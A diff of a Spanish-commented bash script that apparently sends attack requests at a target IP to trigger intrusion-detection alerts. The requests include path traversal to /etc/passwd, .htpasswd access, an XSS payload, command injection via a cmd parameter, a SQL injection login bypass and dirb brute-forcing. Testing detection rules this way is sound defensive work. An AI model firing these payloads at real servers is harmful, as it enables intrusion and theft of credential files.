@@ -55,37 +55,40 @@
 # Escaneo de archivos y directorios
 
 
-# Web.Server.Password.File.Access
-  echo ""
-  echo "  Intentando acceder al archivo /../../etc/passwd"
-  echo ""
+# Alerta: Web.Server.Password.File.Access
   curl -X GET "http://"$vIP":80/../../etc/passwd"
 
-# Escaneo de archivos y directorios
-  # Alerta: HTPasswd.Access
-  echo ""
-  echo "  Intentando acceder al archivo /.htpasswd"
-  echo ""
+# Alerta: HTPasswd.Access
   curl -X GET "http://"$vIP":80/.htpasswd"
 
-# Cross site scripting
-  # Alerta: Cross.Site.Scripting
-  echo ""
-  echo "  Intentando acceder al archivo /.htpasswd"
-  echo ""
+# Alerta: Cross.Site.Scripting
   curl -X GET "http://"$vIP":80/search?query=<script>alert('XSS')</script>"
 
-curl -X GET "http://"$vIP":80/?cmd=ls"
-curl -X GET "http://"$vIP":80/?cmd=whoami;uname -a"
+# Alerta: Generic.Path.Traversal.Detection
+  curl -X GET "http://"$vIP":80/index.php?page=../../../../etc/passwd"
+
+# Alerta: Comtrend.Devices.Information.Disclosure
+  dirb http://"$vIP":80 -X .html,.js,.txt,.log
+
+
+
+
+
+
+
 
 
 # Buscar subdirectorios recursivamente
   dirb http://"$vIP":80 -r
 
+curl -X GET "http://"$vIP":80/?cmd=ls"
+curl -X GET "http://"$vIP":80/?cmd=whoami;uname -a"
 
-# 
-  # Alerta: Comtrend.Devices.Information.Disclosure
-  dirb http://"$vIP":80 -X .html,.js,.txt,.log
+
+
+
+
+
 
 # Simular un agente específico
   dirb http://"$vIP":80 -a "DirBrowser ()"
@@ -109,3 +112,7 @@ curl -X GET "http://"$vIP":80/?cmd=whoami;uname -a"
 # Detección de configuraciones de Apache:
   dirb http://"$vIP":80 /usr/share/dirb/wordlists/vulns/apache.txt
 
+
+# SQL Injection
+  #
+  curl -X GET "http://"$vIP":80/login?username=admin'--&password="
